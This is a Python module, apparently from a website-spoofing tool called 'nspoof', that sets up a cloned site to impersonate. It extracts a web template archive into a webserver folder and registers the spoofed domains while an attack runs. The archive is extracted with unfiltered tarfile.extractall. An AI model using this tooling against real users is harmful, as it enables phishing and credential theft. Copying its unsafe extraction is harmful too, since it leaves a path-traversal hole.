import sys
import os
import tarfile
import shutil
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'utils')))
from renew_config_file import renew_config_file

def add_site_command(params):

	if ATTACK_STATUS['status'] != 0:
		print("L'attaque est déja en cours.")
		return

	if len(params) < 3:
		print("Vous devez spécifier au moins un domaine, un le chemin d'un fichier ZIP contenant les fichiers du site à usurper, et l'activation du HTTPS.")
		return

	if len(WEBSITES) == 0:
		idd = 1
	else:
		idd = WEBSITES[-1][0] + 1

	domains = params[:-2]

	# Recreation of folder
	try:

		newdir = ENV['webserver_location'] + '/website' + str(idd)

		if os.path.exists(newdir):
			shutil.rmtree(newdir)

		os.makedirs(newdir)

	except:
		print("Erreur lors de la recréation du dossier.")
		return

	# Recreation of temp folder
	try:

		tmpdir = ENV['tmp_location']

		if os.path.exists(tmpdir):
			shutil.rmtree(tmpdir)

		os.makedirs(tmpdir)

	except Exception as e:
		print("Erreur lors de la recréation du dossier temporair''e.")
		return

	# Extraction of tarfile
	try:
		with tarfile.open(ENV['nspoof_location'] + "/web-templates/" + params[-2] + ".tar.gz", 'r:gz') as tar:
			tar.extractall(path=tmpdir)
	except:
		print("Erreur. Le fichier tar n'existe pas.")
		return

	# Moving files with directory structure preserved
	try:
	    for root, dirs, files in os.walk(tmpdir):
	        for file in files:
	            # Source file path in tmpdir
	            src_file = os.path.join(root, file)
	            
	            # Relative path from tmpdir (to preserve the directory structure)
	            relative_path = os.path.relpath(root, tmpdir)
	            
	            # Destination path in newdir, creating necessary directories
	            dest_dir = os.path.join(newdir, relative_path)
	            
	            # Ensure the destination directory exists
	            if not os.path.exists(dest_dir):
	                os.makedirs(dest_dir)
	            
	            # Destination file path
	            dest_file = os.path.join(dest_dir, file)
	            
	            # Move the file to the destination, preserving the directory structure
	            shutil.move(src_file, dest_file)
	except Exception as e:
	    print(f"Erreur dans le déplacement : {str(e)}")

	new_site = [idd, domains, 0, 1, [], newdir, int(params[-1])]

	renew_config_file(domains, idd, int(params[-1]))

	WEBSITES.append(new_site)